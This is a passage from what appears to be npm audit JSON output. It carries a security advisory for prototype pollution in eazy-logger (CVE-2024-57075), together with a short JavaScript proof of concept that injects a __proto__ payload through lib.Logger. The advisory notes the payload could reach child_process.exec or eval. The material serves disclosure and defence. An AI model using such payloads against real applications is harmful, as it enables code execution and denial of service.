For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., `child_process.exec`, `eval`), it could enable an attacker to execute arbitrary commands within the application's context.\n\n## Proof of Concept\n\n```js\n(async () => {\nconst lib = await import('eazy-logger');\nvar someObj = {}\nconsole.log(\"Before Attack: \", JSON.stringify({}.__proto__));\ntry {\n// for multiple functions, uncomment only one for each execution.\nlib.Logger (JSON.parse('{\"__proto__\":{\"pollutedKey\":123}}'))\n} catch (e) { }\nconsole.log(\"After Attack: \", JSON.stringify({}.__proto__));\ndelete Object.prototype.pollutedKey;\n})();\n```","reported_by":null,"title":"eazy-logger prototype pollution","metadata":null,"cves":["CVE-2024-57075"],"access":"public","severity":"high","module_name":"eazy-logger","vulnerable_versions":"<=4.0.1","github_advisory_id":"GHSA-r7jx-5m6m-cpg9","recommendation":"None","patched_versions":"<0.0.0","updated":"2025-02-07T14:34:56.000Z","cvss":{"score":7.5,"vectorString":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"},"cwe":["CWE-1321"],"url":"https://github.com/advisories/GHSA-r7jx-5m6m-cpg9"}},"muted":[],"metadata":{"vulnerabilities":{"info":0,"low":0,"moderate":0,"high":1,"critical":0},"dependencies":733,"devDependencies":1,"optionalDependencies":0,"totalDependencies":734}}
